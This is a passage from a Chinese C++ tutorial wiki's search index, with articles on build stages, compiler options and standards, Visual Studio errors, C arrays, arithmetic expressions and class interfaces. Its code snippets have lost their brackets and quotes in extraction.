IDE，也不启用预编译头。 最小控制台程序#include iostreamint main() std::cout Hello, world! ; return 0; 预期输出： Hello, world! #include iostream 使当前翻译单元能够看到标准输入输出设施的声明。std::cout 是标准输出流对象， 在这里调用流插入操作，字符串中的 写入换行符。 普通托管环境中的 C++ 程序以 main 作为入口。返回 0 表示程序正常结束；到达 main 末尾也等价于返回 0，示例中显式写出返回值便于说明退出状态。 项目与源文件IDE 项目保存参与构建的源文件、目标类型、编译选项、链接依赖和输出位置。项目不是 C++ 语法的一部分，同一组 .cpp 文件可以由 Visual Studio 工程、CMake 或直接命令行构建。 多个 .cpp 文件通常分别编译成目标文件，然后共同参与链接： main.cpp - main.objmath.cpp - math.objmain.obj + math.obj + libraries - application.exe 源文件名也不决定程序入口。把包含 main 的文件命名为 main.cpp 是常见约定，并非语言要求。 Visual Studio 的预编译头部分 Visual Studio 项目模板会启用预编译头，并生成 pch.h。预编译头把稳定且频繁包含的头文件预先处理，减少大型项目的重复编译开销。 #include pch.h 这行代码只有在项目已经配置对应预编译头时才有意义。空项目或未启用该功能的项目不应保留它；pch.h 也不是 C++ 标准库的一部分。小型练习可以关闭预编译头，让示例只依赖实际使用的标准头文件。 构建操作IDE 中常见操作名称反映不同构建范围，具体行为仍由项目系统决定： 操作 常见含义 Compile 编译一个或多个源文件，生成目标文件 Build 根据依赖和时间戳编译需要更新的文件，并链接目标产物 Clean 删除项目系统管理的中间文件和输出文件 Rebuild 清理后重新执行完整构建 Run 启动已经生成的程序，部分 IDE 会在运行前触发构建 增量构建会复用未变化的目标文件。编译参数、条件宏或依赖发生变化后，如果构建系统未正确识别依赖，Clean 或 Rebuild 可以排除旧产物干扰，但它不能修复源代码错误。 运行与调试运行程序只负责启动进程。调试运行还会附加调试器，使断点、单步执行、变量查看和调用栈检查成为可能。 程序打印出预期文本，只证明这次输入和执行路径得到了对应输出。调试器能够进一步观察 main 的进入、std::cout 调用和函数返回过程；自动化测试则用于重复验证多组输入和边界条件。","tags":[null,null]},{"title":"数据结构","path":"/wiki/datastructure/index.html","content":"数组、链表、栈、队列与基础算法练习。"},{"title":"从源文件到可执行文件：预处理、编译与链接","path":"/wiki/cpp/cpp-note-06.html","content":"C++ 构建由多个阶段组成。预处理器展开包含关系和条件编译，编译器处理翻译单元并生成目标文件，链接器解析跨文件符号并生成最终产物。 预处理与翻译单元一个 .cpp 源文件经过预处理后形成翻译单元。预处理阶段会处理 #include、#define、#if 等指令，并移除注释。 main.cpp+ main.cpp 包含的头文件+ 条件编译与宏展开结果- 翻译单元 #include iostream 的作用是把对应头文件内容纳入预处理过程，使编译器看到相关声明。它不等同于把标准库实现直接复制到最终程序，也不能替代链接配置。 每个 .cpp 文件通常形成独立翻译单元。这种独立编译模型使大型项目可以增量构建，也要求跨文件声明保持一致。 编译与目标文件编译器对翻译单元执行语法分析、名称查找、类型检查和代码生成。成功后得到 .obj（常见于 Windows）或 .o（常见于 Unix-like 系统）目标文件。 目标文件不只是机器指令，还包含符号表、重定位信息和调试信息等供链接器或调试器使用的数据。它通常不能作为完整程序直接启动。 main.cpp - compiler - main.objutils.cpp - compiler - utils.obj 语法错误、类型不匹配、访问控制错误和翻译单元内不可见的名称通常在这个阶段报告。 链接与符号解析链接器读取目标文件和库，解析一个翻译单元对另一个翻译单元中符号的引用，并为代码和数据分配最终位置。 main.objutils.objstandard or third-party libraries- linker- executable file 函数已有声明却没有任何定义、定义所在目标文件未加入构建、库搜索路径错误或同一符号被重复定义，都会导致链接错误。编译器允许调用一个只有声明的函数，因为它假设定义可以在其他翻译单元或库中提供；链接器负责验证这个假设。 静态库与动态库静态库是目标文件的归档集合。链接静态库时，链接器把程序需要的部分纳入最终产物。动态库由独立文件提供实现，程序在装载或运行时解析相应依赖；Windows 常见 .dll，Linux 常见 .so。 两种库都需要让编译器看到正确声明。动态库还涉及运行时搜索路径、导出符号和版本兼容，静态库则会影响最终文件大小和代码更新方式。具体行为受到平台 ABI 和工具链规则约束。 命令行中的分阶段构建GCC 风格工具链可以显式分开编译和链接： g++ -std=c++20 -Wall -Wextra -c main.cpp -o main.og++ -std=c++20 -Wall -Wextra -c utils.cpp -o utils.og++ main.o utils.o -o app MSVC 可以在 Developer Command Prompt 中使用 /c 只编译不链接： cl /std:c++20 /EHsc /c main.cpp utils.cpplink main.obj utils.obj /OUT:app.exe 构建系统会替项目生成并执行类似命令，同时追踪依赖、配置 Debug Release 参数并组织多个目标。IDE 的 Build 按钮通常只是这个过程的入口。 构建成功后的验证构建成功表示当前配置下通过了预处理、编译和链接，不表示程序逻辑正确。测试负责比较实际结果和预期结果，调试器负责观察一次运行中的状态，静态分析器和运行时检测工具则用于发现部分内存与未定义行为问题。 出现错误时可以按阶段缩小范围：编译诊断先看当前翻译单元的语法和类型；链接诊断检查定义、目标文件与库；运行异常再结合输入、日志、测试和调试器分析。","tags":[null,null,null]},{"title":"C++ 项目的基本开发流程","path":"/wiki/cpp/cpp-note-03.html","content":"C++ 项目的产物通常不是由单个源文件直接运行得到。问题定义、代码组织、编译配置和验证方式共同决定最终程序的行为。 从问题到可执行程序一个小型 C++ 项目可以抽象为下面几步： 明确输入、输出与约束- 设计数据和操作边界- 编写头文件与源文件- 编译并链接- 运行测试- 根据结果调试和修改 这些阶段不是只能执行一次的直线流程。测试发现边界条件遗漏后，代码和设计都可能需要调整；构建错误也可能暴露文件依赖或接口声明问题。 问题边界与数据设计以“编写一个计算器”为例，需求至少要回答以下问题： 支持哪些运算和数值类型； 输入来自命令行、文件还是图形界面； 除零、格式错误和溢出如何处理； 程序执行一次后退出，还是持续接收输入； 输出是否需要固定精度或错误码。 这些约束会影响函数接口、数据类型和错误处理方式。需求只有一句模糊描述时，代码中的分支往往会替需求作出未经记录的决定。 源文件与接口边界C++ 源文件通常使用 .cpp 扩展名，声明常放在 .h 或 .hpp 头文件中。main.cpp 是主源文件的常见名称，但 C++ 标准不要求入口所在文件必须这样命名。 小型项目可以从以下结构开始： calculator/|-- CMakeLists.txt|-- include/| `-- calculator.hpp|-- src/| |-- calculator.cpp| `-- main.cpp`-- tests/ `-- calculator_test.cpp 目录结构不是固定模板。它表达的是三类边界：公开声明、实现代码和验证代码。项目较小时可以更简单，文件增多后再按职责拆分。 构建、测试与调试编译器把源文件转换成目标文件，链接器解析跨文件符号并生成程序。构建系统记录源文件、编译选项、目标类型和库依赖，IDE 或命令行再调用构建系统执行这些规则。 程序成功构建只说明语法、类型检查和链接过程没有阻止产物生成。运行时结果仍需通过测试确认。输入测试通常包括正常值、边界值和无效值；资源相关代码还要观察释放顺序、错误路径和异常退出。 调试器用于查看执行过程，可以设置断点、单步运行、检查变量与调用栈。日志和测试用于保留可重复的证据，调试器则适合定位一次具体运行中的状态变化。三者承担的作用不同。","tags":[null,null]},{"title":"类型别名、auto 与返回类型推导","path":"/wiki/cpp/cpp-topic-aliases-and-deduction.html","content":"类型别名保留原类型身份，只改变源代码中的名称；auto 则根据初始化器建立一个具体类型。引用、顶层 const、花括号初始化和多个返回路径都会影响推导结果，因此省略类型并不等于省略类型设计。 typedef 与类型别名using 别名为现有类型提供新名称，不创建新的独立类型。 别名可以隐藏复杂模板细节和表达领域含义；需要强类型隔离时应定义包装类型。 类型别名不会创建新类型，只为现有类型提供另一个名称，因此重载解析不会把两者区分开。别名适合隐藏冗长模板、表达领域单位或集中替换实现；若必须禁止不同语义值互换，需要包装类而不是 alias。 用别名表达领域类型 #include iostreamusing UserId = unsigned long long;int main() const UserId id42; std::cout id ; 类型别名改善接口可读性，但不会创建与底层类型不同的强类型。 使用 auto 推导对象类型auto 从初始化器推导类型，通常会丢弃顶层 const 和引用，需要用 const auto 等形式保留所需限定。 auto 适合迭代器、模板结果和类型容易从初始化器确认的表达式，不应隐藏影响语义的重要单位或所有权。 auto 从初始化器推导类型，能减少重复并保留迭代器、lambda 等难写类型。按值推导会移除顶层 const 和引用，需要借用时显式写 const auto 或 auto。当初值不能清楚表达领域类型时，显式类型仍更易审查。 auto 保留初始化器的类型 #include iostream#include vectorint main() const std::vector values2, 4, 6; for (const auto value : values) std::cout value ; auto 减少重复类型名，但 const、引用和值拷贝语义仍需由声明明确表达。 函数类型推导尾置返回类型可以在参数进入作用域后书写返回类型，auto 返回类型由 return 表达式推导。 多个 return 必须推导出一致类型；公共接口过度依赖推导会让声明难以独立理解。 auto 返回类型从所有非丢弃 return 语句推导，结果必须一致；普通 auto 会按值推导并移除顶层引用与 const。需要精确保留表达式引用和值类别时可使用 decltype(auto)，但返回局部引用的生命周期风险也会被原样保留。 让返回类型推导保持单一规则 #include iostreamauto area(int width, int height) return width * height;int main() std::cout area(4, 3) ; auto 返回类型需要所有 return 路径推导出一致类型；公共接口仍可写显式返回类型增强契约。 参考资料 LearnCpp 10.7：typedef 与类型别名 LearnCpp 10.8：使用 auto 推导对象类型 LearnCpp 10.9：函数类型推导 cppreference：类型转换、别名与推导相关条目","tags":[null,null]},{"title":"C++ 编译配置：Debug、Release、标准一致性与诊断","path":"/wiki/cpp/cpp-note-07.html","content":"构建配置决定编译器和链接器如何处理项目。可执行文件名称、输出目录、优化级别、调试信息、预处理宏、头文件搜索路径和库搜索路径都可能随配置变化。 Debug 与 ReleaseVisual Studio 等 IDE 通常会为新项目创建 Debug 和 Release 两套配置。它们不是两种 C++ 语言模式，而是两组构建参数。 配置 常见设置 主要用途 Debug 保留调试信息、降低或关闭优化、启用调试运行库 开发、单步调试和定位状态变化 Release 启用优化、减少调试信息、使用发布运行库 发布产物、性能和体积测试 优化可能改变指令顺序、内联函数并移除无用变量，因此调试器中观察到的执行位置和变量状态可能与源码不完全对应。只在 Release 配置中出现的异常也可能来自未定义行为、未初始化数据或依赖求值时机的代码，不能直接归因于优化器错误。 Visual Studio 工具栏中的“解决方案配置”可以切换当前配置。项目属性页顶部还包含“配置”和“平台”两个范围；修改编译选项前需要确认设置应用于当前配置还是所有配置。 语言标准与编译器扩展C++ 标准定义语言语法和标准库接口，编译器扩展则是特定工具链额外接受的语法或行为。依赖扩展的程序可能无法通过其他编译器，或者在启用严格模式后停止编译。 MSVC 可以显式选择语言标准并启用一致性模式： cl /std:c++20 /permissive- /EHsc main.cpp /permissive- 会让 MSVC 更严格地执行标准一致性规则，但它不等于启用所有警告，也不会替代跨编译器测试。 GCC 和 Clang 使用 -std 选择标准版本，并可用 -Wpedantic 报告部分非标准扩展： g++ -std=c++20 -Wall -Wextra -Wpedantic main.cpp -o app 语言标准属于构建契约的一部分。项目使用的标准版本应写入 CMake、Meson 或 IDE 项目配置，避免只保存在某台开发机的全局设置中。 警告与错误违反必须诊断的语言规则时，编译器至少需要给出诊断，但 C++ 标准不统一规定诊断文本、编号以及警告等级。相同代码在不同编译器上可能产生不同提示。 MSVC 项目常使用 /W4 获取较完整的常规警告： cl /std:c++20 /permissive- /W4 /EHsc main.cpp GCC 或 Clang 常见组合是： g++ -std=c++20 -Wall -Wextra -Wpedantic main.cpp -o app 这些选项都不代表“开启编译器的全部警告”。警告也需要结合代码语义处理：修复真实缺陷，确认有意行为，并只在能够说明原因的最小范围内抑制误报。 /WX 或 -Werror 会把警告提升为错误，适合用于规则稳定的持续集成配置。直接对遗留项目全局启用可能阻断构建，因此通常需要先清理已有警告并固定编译器版本。 配置检查顺序同一项目在不同机器或配置下行为不一致时，可以依次检查： 当前选择的 Debug Release 和目标平台。 C++ 语言标准版本。 预处理宏和运行库选项。 头文件、库目录和实际链接的库版本。 一致性模式、警告级别与被单独禁用的诊断。 构建系统生成的完整编译命令。 Visual Studio 的“输出”窗口、CMake 的 verbose 构建以及 Ninja 的 -v 参数都可以显示实际命令。以实际命令为准，界面中的配置名称本身不能证明编译器收到了哪些参数。 参考资料 MSVC /permissive- 一致性模式 MSVC 编译器警告级别 GCC Warning Options","tags":[null,null,null]},{"title":"Visual Studio C++ 常见编译与链接问题","path":"/wiki/cpp/cpp-note-08.html","content":"C++ 项目中的错误需要先按阶段定位。编译器处理单个翻译单元，链接器组合目标文件和库，程序启动后才进入运行阶段。错误编号和输出窗口通常能够说明故障发生在哪一层。 控制台窗口立即关闭从资源管理器直接启动控制台程序时，进程结束后窗口会随之关闭。Visual Studio 中使用“开始执行（不调试）”可以让 IDE 在程序退出后保留窗口；也可以从已有终端中启动生成的可执行文件。 不宜为了保留窗口而在业务代码末尾固定加入多次 std::cin.get()。输入缓冲区状态不同会改变阻塞行为，也会把开发环境问题带进程序逻辑。 程序没有可见输出先确认程序是否实际启动、输出是否写到了当前终端，以及包含输出语句的代码路径是否被执行。Visual Studio 的“输出”窗口和程序退出码可以区分构建失败、启动失败和正常退出。 安全软件可能隔离新生成的可执行文件，但直接关闭防护不是常规处理方式。应检查拦截记录、文件签名和项目目录，并只对可信构建目录配置最小范围的例外。 找不到 main 或 WinMain链接错误 unresolved external symbol main、_main、WinMain 或 wWinMain 表示当前目标需要某个入口符号，但参与链接的目标文件没有提供对应定义。 常见原因包括： 包含 main 的源文件未加入当前目标； 函数名称、参数或返回类型写错； 项目子系统选择为 Windows，但代码提供的是控制台入口 main； 创建的是库项目，本来就不应生成可执行文件。 控制台程序通常使用： int main() return 0; Windows GUI 项目的入口和子系统规则不同，不能用“所有项目都必须有 main”概括。 main 重复定义一个可执行目标只能有一个入口定义。练习项目把多个带 main 的 .cpp 文件同时加入同一目标时，链接器会报告重复符号。 可以为每个练习建立独立项目或独立 CMake target，也可以在当前目标中排除暂不参与构建的源文件。删除文件不是唯一处理方式。 无法使用指定版本的语言特性编译器版本和项目选择的语言标准都会影响特性可用性。Visual Studio 可在“项目属性 - CC++ - 语言 - C++ 语言标准”中选择标准；命令行对应 /std:c++17、/std:c++20 等选项。 升级 IDE 不一定会修改旧项目的语言标准。确认编译器版本后，还需要检查当前配置实际使用的 /std 参数。 LNK1168：无法打开 .exe 进行写入LNK1168 表示链接器无法替换输出文件。最常见的情况是上一轮程序仍在运行，或者调试会话没有结束。 排查顺序如下： 停止 Visual Studio 中的调试会话。 在任务管理器中确认同名进程已经退出。 检查输出文件是否被其他工具占用或隔离。 检查输出目录的写入权限。 清理后重新构建。 重启系统可以释放残留句柄，但不应替代对占用进程的定位。 cin、cout 或 endl 未声明标准流对象声明在 iostream 中，并位于 std 命名空间： #include iostreamint main() std::cout Hello ; return 0; endl 末尾是小写字母 l，同时会刷新输出缓冲区。只需要换行时， 通常更直接；需要立即刷新时再使用 std::endl 或 std::flush。 C1010：未找到预编译头指令启用预编译头后，参与该配置的源文件需要包含项目指定的预编译头，现代 Visual Studio 模板通常使用 pch.h，旧项目可能使用 stdafx.h。 处理方式有两种： 在要求使用预编译头的源文件开头包含正确头文件； 在该文件或整个项目的“预编译头”设置中选择“不使用”。 预编译头只用于减少重复解析成本，不是 C++ 语法要求。小型练习项目可以关闭，较大项目则应保持创建和使用配置一致。 PDB 符号提示调试器提示“无法找到或打开 PDB 文件”时，需要区分项目自身符号和系统库符号。项目的 PDB 缺失会影响断点和源码映射；Windows 系统库没有下载符号通常不影响程序运行。 Microsoft Symbol Server 可以在 Visual Studio 的调试符号设置中按需启用。符号下载需要额外时间和缓存空间，因此应根据调试目标配置，而不是把所有 PDB 提示都当作编译错误。 按阶段读取诊断 阶段 常见现象 检查重点 编译 语法、类型、名称查找错误 当前 .cpp、包含关系、语言标准 链接 LNK 开头错误、未解析或重复符号 目标文件、库、入口和项目子系统 启动 文件无法执行、被拦截或缺少动态库 输出路径、运行库、系统安全记录 运行 输出错误、崩溃或行为异常 输入、状态、调试器、测试和未定义行为 先确定阶段，再处理错误编号附近的第一条有效诊断，通常比反复 Clean、Rebuild 或重启更容易找到原因。 参考资料 MSVC 编译器和生成工具错误 MSVC 链接器工具错误 LNK1168 Visual Studio 预编译头文件","tags":[null,null,null,null]},{"title":"C++ 语言标准的选择、配置与检测","path":"/wiki/cpp/cpp-note-09.html","content":"C++ 标准持续演进，编译器也会同时支持多种语言模式。安装了较新的编译器，不代表项目会自动采用最新标准；实际可用的语法和标准库接口由编译器版本、标准模式与实现完成度共同决定。 语言标准与编译器版本C++11、C++14、C++17、C++20 和 C++23 是不同版本的语言标准。名称中的数字来自标准发布年份，正式标准则以 ISOIEC 14882 的不同版本发布。 编译器版本描述的是 GCC、Clang 或 MSVC 的具体发行版本。一个编译器可以提供多个标准模式，也可能只实现某个标准的一部分。因此下面三个问题需要分别确认： 项目配置选择了哪个 C++ 标准模式； 当前编译器是否接受对应选项； 项目使用的语言特性和标准库功能是否已经由该版本完整实现。 标准模式是项目构建契约的一部分。只升级 IDE 或编译器而不检查项目参数，旧项目仍可能继续按原来的标准模式构建。 选择项目使用的标准学习和个人练习可以使用工具链稳定支持的较新正式标准，以便接触当前语言特性。团队项目还需要同时考虑依赖库、目标平台、最低编译器版本、持续集成环境和 ABI 兼容要求，不能只按标准版本数字选择。 场景 选择依据 学习与独立练习 当前编译器稳定支持的较新正式标准 跨平台项目 所有目标工具链共同可靠支持的标准 长期维护项目 已记录的最低编译器、依赖与部署环境约束 预览功能实验 独立分支或实验项目，不作为稳定构建基线 latest、preview 或开发代号模式可能启用尚未定稿或尚未完整实现的功能。代码行为、编译器支持和二进制兼容性都可能随工具链更新而变化，因此这类模式更适合验证新特性。 在 MSVC 中选择标准Visual Studio 可以在以下位置为项目设置 C++ 语言标准： 项目属性- 配置属性- C/C++- 语言- C++ 语言标准 设置前需要确认属性页顶部的配置范围。Debug 和 Release 是两组独立配置；希望它们采用相同标准时，可以选择“所有配置”，或者分别检查每个配置的实际参数。 MSVC 命令行使用 /std 选项： cl /std:c++17 /EHsc main.cppcl /std:c++20 /EHsc main.cpp Microsoft 当前文档还列出了 /std:c++23preview 与 /std:c++latest。前者启用已进入 C++23 的预览实现，后者还可能包含后续工作草案和实验功能；两者都不等同于一个已经完整实现并保持兼容的正式标准模式。 在 GCC 与 Clang 中选择标准GCC 和 Clang 使用 -std 选项选择语言模式： g++ -std=c++20 -Wall -Wextra -Wpedantic main.cpp -o appclang++ -std=c++20 -Wall -Wextra -Wpedantic main.cpp -o app -std=c++20 面向 ISO C++20 模式，-std=gnu++20 则同时允许 GNU 扩展。需要在不同编译器之间迁移代码时，ISO 模式配合相应诊断选项更容易暴露对扩展的依赖。 在 VS Code 中，构建任务和 IntelliSense 是两套配置。tasks.json 中的 -std=c++20 会传给实际编译器；CC++ 扩展中的 cppStandard 只控制编辑器的代码分析。只修改 IntelliSense 设置，不会改变构建命令。 C_Cpp.default.cppStandard: c++20 用预定义宏检测实际标准模式C++ 实现通过 __cplusplus 宏报告当前语言标准版本。MSVC 默认可能为了兼容旧代码而让 __cplusplus 保持为 199711L；此时 _MSVC_LANG 更能反映 /std 选择的模式。启用 /Zc:__cplusplus 后，MSVC 也会按所选标准更新 __cplusplus。 下面的程序只打印编译器报告的标准版本值，不预设运行结果： #include iostreamconstexpr long language_standard()#if defined(_MSVC_LANG) return _MSVC_LANG;#else return __cplusplus;#endifint main() std::cout language_standard() ; 常见正式标准对应的值如下： 宏值 语言标准 199711L C++98 C++03 201103L C++11 201402L C++14 201703L C++17 202002L C++20 202302L C++23 预览模式可能报告介于两个正式值之间或高于当前正式值的数字。宏值说明编译器当前选择的语言模式，不保证该模式下每项语言和标准库特性都已完整实现。 标准设置未生效时的检查顺序当检测值与预期不一致时，可以按构建链路检查： 确认正在构建正确的项目、目标平台和 Debug Release 配置。 查看构建输出中的完整编译命令，确认 /std 或 -std 参数实际传给了编译器。 检查构建系统是否覆盖了 IDE 属性，或 IDE 是否仍在使用旧的生成目录。 在 VS Code 中分别核对构建任务和 IntelliSense 配置。 确认编译器版本支持所选模式及项目需要的具体特性。 编译器接受标准选项只说明它进入了对应模式。涉及较新的语言或标准库功能时，还应查询该编译器版本的特性支持表，并在项目的所有目标环境中构建验证。 参考资料 LearnCpp 0.12：Choosing a language standard LearnCpp 0.13：What language standard is my compiler using? Microsoft：/std 语言标准选项 GCC：C++ Dialect Options","tags":[null,null,null]},{"title":"C 风格数组、退化与多维存储","path":"/wiki/cpp/cpp-topic-c-arrays.html","content":"C 风格数组的存储可以连续且高效，但接口边界容易丢失长度：数组参数通常调整为指针，C 字符串依赖空字符终止，多维数组还要求除第一维外的步长在类型中可知。现代接口可以用 std::array、std::span 和拥有型容器保留更多边界信息。 概念索引 主题 规则边界 C 风格数组 C 风格数组在类型中包含元素数量并提供连续存储，但赋值、传参和边界接口较弱。 C 风格数组退化 数组在多数表达式中转换为首元素指针，长度信息随之丢失。 指针算术与下标 同一数组内的指针可以加减偏移和比较，越过尾后指针只能作为边界而不能解引用。 C 风格字符串 C 风格字符串是以空字符终止的 char 序列，长度扫描依赖终止符存在。 C 风格字符串符号常量 字符串字面量具有 const char[N] 类型并包含结尾空字符，不应通过指针修改。 多维 C 风格数组 多维数组是数组的数组，除第一维外的内层长度参与地址计算并通常必须在参数类型中已知。 多维 std::array 嵌套 std::array 保留每一维长度并支持容器接口，但类型和初始化花括号较繁琐。 C 风格数组新代码固定长度优先 std::array，运行期长度优先 vector，借用范围优先 span。 C 风格数组的长度属于类型，在定义处可由初始化器推导。它缺少整体赋值和标准容器成员，并在多数表达式中退化为指针。与 C API 或底层布局交互时仍会遇到它，新 C++ 接口则优先 array、vector 或 span。 C 数组长度与范围 for #include cstddef#include iostreamint main() const int values[]2, 4, 6; std::cout std::size(values) ; for (int value : values) std::cout value ; 数组对象仍在当前作用域时可由 std::size 得到长度；传给指针参数后长度信息会丢失。 C 风格数组退化按引用接收数组或使用 std::span 可以保留范围信息；sizeof 指针不能得到原数组长度。 C 风格数组作为多数表达式的操作数时会转换为首元素指针，长度信息随之丢失。函数形参写成 T values[] 实际仍是指针。C++20 的 std::spanT 把地址和长度放回同一个借用类型，可以同时接收数组、std::array 和连续容器。 用引用参数阻止数组退化 #include cstddef#include iostreamtemplate std::size_t Sizestd::size_t length(const int ()[Size]) return Size; int main() const int values[]1, 2, 3; std::cout length(values) ; 数组引用保留 Size；普通 const int* 参数只接收首元素地址，无法恢复原长度。 用 span 同时传递地址和长度 int sum(std::spanconst int values) return std::accumulate(values.begin(), values.end(), 0); span 不拥有元素，但保留范围长度，避免仅凭裸指针猜测边界。 C++20 的 std::span 是连续对象序列的非拥有视图，可以替代“裸指针 + 长度”的许多接口。 指针算术与下标p[i] 定义为 *(p + i)，所有下标安全都依赖调用方保证合法范围。 指针加减只在同一数组对象及尾后位置的范围内有定义，尾后指针可以比较或作为边界，但不能解引用。两个指针相减也要求指向同一数组。迭代器把类似操作抽象到容器上，并按类别限制可用运算。 指针算术只在同一数组范围内 #include iostreamint main() const int values[]2, 4, 6; const int* beginvalues; const int* endvalues + 3; for (auto currentbegin; current != end; ++current) std::cout *current ; 可以形成尾后指针但不能解引用；跨不同数组比较或运算没有通用意义。 C 风格字符串复制和拼接必须同时管理容量与终止符；普通 C++ 业务代码优先 stringstring_view。 C 风格字符串以首个空字符确定逻辑长度，因此缓冲区容量和字符串长度是两项独立信息。缺少终止符的读取会越过数组边界，复制时只检查来源长度也可能少算终止符位置。新接口优先用 std::string 管理所有权，用 std::string_view 只读借用。 C 字符串依赖空终止符 #include cstring#include iostreamint main() const char text[]hello; std::cout std::strlen(text) ; strlen 扫描到第一个空字符；缓冲区缺少终止符时调用会越界读取。 把缓冲区容量写入接口 bool copy_name(std::spanchar output, std::string_view name) if (name.size() + 1 output.size()) return false; std::ranges::copy(name, output.begin()); output[name.size()] = \\0; return true; 写入前验证容量，并显式补上空终止字符。 C 风格字符串符号常量多个相同字面量是否共享存储由实现决定，不能用地址比较字符串内容。 普通字符串字面量的类型是 const char 数组，具有静态存储期，并包含末尾空字符。相同字面量是否共享存储不受保证。不能通过去 const 指针修改字面量；需要可写缓冲区时创建 char[]，需要拥有文本时创建 std::string。 字符串字面量具有静态存储期 #include iostream#include string_viewint main() constexpr std::string_view labelready; std::cout label ; 字面量数组在程序期间存在且不可修改；string_view 可安全借用它，但不自动保证其他来源的生命周期。 多维 C 风格数组行主序连续布局适合固定矩阵，但复杂接口可用平坦存储加索引函数或 mdspan。 多维 C 数组按行连续存储，除第一维外的维度通常必须出现在函数参数类型中，编译器才能计算行跨度。动态尺寸与复杂索引更适合连续 vector 加索引函数，既减少分配，也能集中验证行列范围。 多维 C 数组的行列布局 #include iostreamint main() const int matrix[2][3]1, 2, 3, 4, 5, 6; for (const auto row : matrix) for (int value : row) std::cout value ; 二维数组按行连续保存，传参时除第一维外的维度需要保留在类型中。 多维 std::arrayC++23 std::mdspan 为已有连续存储提供非拥有多维视图，适合把布局与存储所有权分离。 嵌套 std::array 把每个维度写进类型并保持连续的行元素布局，适合编译期固定矩阵。索引顺序要与类型嵌套顺序一致。C++23 std::mdspan 可为外部连续存储提供多维非拥有视图，C++20 需自行封装。 二维 std::array #include array#include iostreamint main() const std::arraystd::arrayint, 3, 2 matrix1, 2, 3, 4, 5, 6; std::cout matrix[1][2] ; 嵌套 array 保留固定维度和容器接口；C++23 mdspan 可在不拥有数据的前提下提供多维索引视图。 C++23 的 std::mdspan 为多维连续数据提供非拥有视图；C++20 项目仍可用嵌套 std::array 或自行封装索引。 参考资料 LearnCpp 17.7：C 风格数组 LearnCpp 17.8：C 风格数组退化 LearnCpp 17.9：指针算术与下标 LearnCpp 17.10：C 风格字符串 LearnCpp 17.11：C 风格字符串符号常量 LearnCpp 17.12：多维 C 风格数组 LearnCpp 17.13：多维 std::array cppreference：固定数组与 C 风格数组相关条目","tags":[null,null]},{"title":"算术表达式、求值顺序与副作用","path":"/wiki/cpp/cpp-topic-arithmetic-expressions.html","content":"把表达式看成数学公式会漏掉三类 C++ 规则：操作数先转换成什么类型、运算符如何分组、带副作用的子表达式按什么顺序求值。括号可以明确分组，却不能重新定义所有求值顺序；复杂状态变化更适合拆成独立语句。 运算符优先级与结合性优先级决定不同运算符如何分组，结合性解决同级运算符的分组方向。 它们不规定操作数求值顺序；复杂表达式使用括号和中间变量能同时减少歧义与副作用风险。 优先级和结合性只回答表达式如何加括号，不回答各操作数何时求值。即使知道 * 高于 +，也不能由此推断两个函数调用的先后。存在副作用时，把调用拆成独立语句；只涉及纯计算时，括号可以直接表达希望读者看到的分组。 用括号固定运算分组 #include iostreamint main() const bool allowed(2 + 3) * 4 == 20; std::cout allowed ; 括号表达意图；优先级和结合性不规定所有操作数的求值顺序。 算术运算符整数除法向零截断，浮点除法保留近似小数结果，操作数类型决定实际规则。 溢出、除零和混合符号性都需要单独处理，运算符本身不会执行范围检查。 算术运算先根据操作数执行提升和通常算术转换，再按共同类型计算。整数除法向零截断，除数为零没有定义；有符号溢出也是未定义行为。需要检查范围时，判断必须发生在潜在溢出的表达式之前。 显式区分整数和浮点除法 #include iostreamint main() const int whole7 / 2; const double fraction7.0 / 2.0; std::cout whole fraction ; 操作数类型决定除法规则；除零、溢出和混合符号性必须在业务边界单独校验。 余数与幂运算整数余数运算符 % 的结果与左操作数同号，并满足商向零截断的关系。 C++ 没有幂运算符，^ 是按位异或；幂运算使用 std::pow 或针对整数实现经过溢出检查的算法。 整数余数满足商向零截断后的关系，结果符号跟随左操作数。^ 是按位异或而不是乘方；std::pow 主要处理浮点幂，整数幂若要求精确和溢出检测，通常应使用按平方分解的专用算法。 余数和幂运算使用不同接口 #include cmath#include iostreamint main() const int remainder17 % 5; const double powerstd::pow(2.0, 3.0); std::cout remainder power ; ^ 是按位异或而不是幂运算；整数幂需要另外设计溢出策略。 递增递减与副作用前置递增先修改并产生修改后的左值，后置递增产生修改前的值并完成副作用。 同一完整表达式中对同一对象进行未排序的多次读写可能产生未定义行为，应拆成独立语句。 前置递增修改对象后产生该对象的左值，后置递增通常需要保留修改前的值。对迭代器等类类型，若旧值没有用途，前置形式也避免构造无用副本。同一完整表达式里对同一标量进行没有顺序保证的多次修改，会进入未定义行为。 把副作用拆成独立语句 #include iostreamint main() int index0; const int currentindex; ++index; std::cout current index ; 前置递增直接产生修改后的对象；拆开读取与修改后，求值顺序和旧值用途都明确。 把修改拆成独立语句 const int old_valuevalue;++value;consume(old_value, value); 拆开后，调用参数不再依赖同一表达式中的副作用排序。 逗号运算符内建逗号运算符先求值左操作数并丢弃结果，再求值右操作数。 它的优先级很低且容易与参数分隔符混淆，普通业务逻辑更适合使用独立语句。 内建逗号运算符保证先完成左表达式，再计算并返回右表达式结果。它的优先级很低，也容易与参数和初始化列表中的分隔逗号混淆。除 for 循环的窄小表达式外，独立语句通常更便于阅读和调试。 谨慎使用逗号运算符 #include iostreamint main() int value; const int result(value = 2, value + 3); std::cout result ; 内建逗号运算符先完成左侧再求值右侧；普通业务代码通常用两条语句表达同一流程。 参考资料 LearnCpp 6.1：运算符优先级与结合性 LearnCpp 6.2：算术运算符 LearnCpp 6.3：余数与幂运算 LearnCpp 6.4：递增递减与副作用 LearnCpp 6.5：逗号运算符 cppreference：运算符相关条目","tags":[null,null]},{"title":"this、类文件组织与友元边界","path":"/wiki/cpp/cpp-topic-class-interfaces.html","content":"非静态成员函数通过隐藏的 this 指针访问当前对象。链式调用、引用限定符和返回成员引用都与这个对象的值类别及生命周期有关。类拆到头文件与源文件后，友元只应开放完成具体操作所需的最小访问范围。 隐藏的 this 指针与成员函数链非静态成员函数通过隐式 this 指针访问当前对象，const 成员函数中的 this 指向 const 对象。 返回 *this 的引用可以形成链式调用，但每个操作仍应保持对象有效并避免返回悬空引用。 this 指向当前对象，成员访问隐式使用它。返回 *this 引用可以构造链式接口，但每个操作仍应保持对象有效。lambda 捕获 this 只保存指针，不拥有对象；延迟回调必须保证对象生命周期或捕获所需值。 this 指针和链式调用 #include iostreamclass Counterpublic: Counter add(int amount) this-m_value += amount; return *this; int value() const return m_value; private: int m_value;;int main() Counter counter; std::cout counter.add(2).add(3).value() ; 成员函数通过 this 访问当前对象，返回 *this 